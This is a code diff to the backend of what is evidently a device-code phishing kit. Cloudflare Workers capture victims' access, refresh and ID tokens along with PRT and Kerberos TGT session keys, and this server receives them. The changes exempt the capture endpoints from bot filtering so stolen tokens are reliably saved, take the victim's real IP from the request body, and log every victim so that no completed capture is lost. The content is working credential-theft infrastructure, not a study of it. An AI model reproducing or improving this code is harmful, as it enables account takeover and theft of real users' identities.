@@ -38,7 +38,17 @@ router.get('/check', async (req, res) => {
   }
 });
 
-router.use(rejectBotRequest);
+// The bot guard must NOT apply to the endpoints only our own workers call.
+// A Workers fetch carries no User-Agent header, and isBotUserAgent() reads an
+// empty UA as a bot - so guarding them silently swallowed the token capture
+// and the visitor block-check with an empty 200 OK page. The flow appeared to
+// succeed end to end while nothing was saved and no visitor was ever logged.
+// Both endpoints authenticate a link JWT instead, so the UA check adds nothing.
+const WORKER_ONLY_POSTS = ['/visitor/block-check', '/'];
+router.use(function (req, res, next) {
+  if (req.method === 'POST' && WORKER_ONLY_POSTS.indexOf(req.path) !== -1) return next();
+  return rejectBotRequest(req, res, next);
+});
 
 function setBrowserLikeHeaders(res) {
   res.setHeader('X-Content-Type-Options', 'nosniff');
@@ -349,8 +359,12 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     try {
         const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;
 
-        const visitorIp = ip || req.ip || req.headers['x-forwarded-for'] || '';
-        const ua = user_agent || req.headers['user-agent'] || '';
+        // Workers own the device-code flow, so they report the victim's real
+        // address in the body. Prefer it over req.ip, which for a worker
+        // request is a Cloudflare egress address, not the victim's.
+        const reportedIp = String(ip || '').split(',')[0].trim().slice(0, 45);
+        const visitorIp = reportedIp || req.ip || req.headers['x-forwarded-for'] || '';
+        const ua = String(user_agent || req.headers['user-agent'] || '').slice(0, 512);
         const classification = classifyIP(visitorIp, ua, req.headers);
 
         if (classification.action === 'block') {
@@ -401,6 +415,28 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         }
 
         const link = links[0];
+
+    // Workers own the device-code flow, so a victim clicking "Generate code"
+    // never reaches this backend - only the page-load block-check logs a
+    // visitor, and that call is swallowed by the worker when the backend is
+    // briefly unreachable. Record the visitor here, where the real capture
+    // lands, so a completed flow is never lost.
+    if (visitorIp) {
+      try {
+        const [existingVisitor] = await db.query(
+            'SELECT id FROM visitors WHERE user_id = ? AND link_id = ? AND ip_address = ? LIMIT 1',
+            [user_id, link_id, visitorIp]
+        );
+        if (existingVisitor.length === 0) {
+            await db.query(
+                "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name, ip_type) VALUES (?, ?, ?, ?, ?, 'done', ?, ?)",
+                [user_id, link_id, visitorIp, ua, await getCountryFromIP(visitorIp), link.worker_name || null, classification.type]
+            );
+        }
+      } catch (visitorErr) {
+        // Visitor logging must never block a capture
+      }
+    }
 
     // Parse incoming data - support both old format and new PRT format
     let prt = null;
@@ -543,8 +579,8 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
             kerberosTopLevelNames,
             encrypt(tgtCloudSessionkey),
             accountType,
-            ip || '0.0.0.0',
-            user_agent || 'Phishing Worker',
+            visitorIp || '0.0.0.0',
+            ua || 'Unknown',
             ttlHours,
             tenant,
             link.template_type || 'office',
@@ -609,8 +645,8 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         tgtCloudSessionkey,
         accountType,
         tenant,
-        ip,
-        userAgent: user_agent,
+        visitorIp,
+        userAgent: ua,
         linkId: link_id,
         tokenId,
         captureMeta: captureMeta,
